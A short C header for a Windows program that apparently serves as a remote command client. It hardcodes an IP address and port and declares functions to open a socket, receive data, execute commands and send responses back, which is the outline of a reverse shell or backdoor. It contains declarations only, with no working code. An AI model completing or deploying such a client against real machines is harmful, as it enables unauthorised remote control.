#pragma once

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAD_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>

#define IP_ADDRESS "192.168.1.102"
#define PORT 20000
#define SOCK_BUFFER 1024

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "Advapi32.lib")


int initSock(LPCSTR ipAddress, int port);
int sendResponse(char* data);
int doCmd(char* command);
char* recvData();

// Encode/Decode
char* base64Decode(char data[], int size);